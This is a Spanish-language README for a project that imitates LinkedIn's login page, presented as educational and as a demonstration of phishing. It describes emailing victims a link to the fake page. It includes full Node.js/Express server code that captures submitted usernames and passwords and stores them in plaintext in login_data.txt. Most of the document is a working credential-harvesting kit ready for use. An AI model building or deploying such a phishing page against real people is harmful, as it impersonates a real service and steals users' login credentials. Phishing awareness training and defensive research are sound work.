# Emulador de Página de Inicio de Sesión de LinkedIn

Este proyecto es una página web que emula la página de inicio de sesión de LinkedIn, con fines educativos. Su propósito es demostrar cómo se pueden realizar ataques de phishing mediante el uso de una página web falsa para recolectar credenciales de usuario.

## Descripción

La aplicación web replica la página de inicio de sesión de LinkedIn (https://www.linkedin.com/login). El vector de ataque inicial es enviar un correo electrónico que contiene un enlace a esta página falsa, con el fin de que los usuarios ingresen su correo electrónico y contraseña. 

Los datos ingresados en el formulario de inicio de sesión se almacenan en un archivo de texto en el servidor llamado `login_data.txt`. Este archivo registra el nombre de usuario y la contraseña ingresada por el usuario.

## Estructura del Proyecto

- **`public/`**: Carpeta que contiene los archivos estáticos, como el HTML y las imágenes.
- **`login_data.txt`**: Archivo en el que se almacenan los datos ingresados por los usuarios.
- **`server.js`**: Código del servidor en Node.js que maneja las solicitudes de inicio de sesión y almacena los datos en `login_data.txt`.

## Código del Servidor

El código del servidor se encuentra en `server.js` y utiliza los siguientes módulos de Node.js:

- **`express`**: Framework para construir la aplicación web.
- **`body-parser`**: Middleware para analizar cuerpos de solicitudes HTTP.
- **`fs`**: Módulo para manejar operaciones de archivos.
- **`path`**: Módulo para manejar y resolver rutas de archivos.

### Código del Servidor

```javascript
// Importa los módulos necesarios
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

// Crea una instancia de la aplicación Express
const app = express();
const port = 3005;

// Configura el middleware para analizar cuerpos de solicitudes en formato JSON
app.use(bodyParser.json());

// Configura el middleware para servir archivos estáticos desde la carpeta 'public'
app.use(express.static('public'));

// Define una ruta POST para el endpoint '/login'
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Validación simple
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Correo electrónico y contraseña son requeridos.' });
    }

    // Ejemplo de escritura en un archivo (para pruebas)
    const filePath = path.join(__dirname, 'login_data.txt');
    const logEntry = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error('Error al guardar los datos:', err);
            return res.status(500).json({ success: false, message: 'Error al procesar la solicitud.' });
        }
        console.log('Datos guardados en el archivo.');
        res.json({ success: true, message: 'Inicio de sesión exitoso' });
    });
});

// Configura el servidor para escuchar en el puerto definido
app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
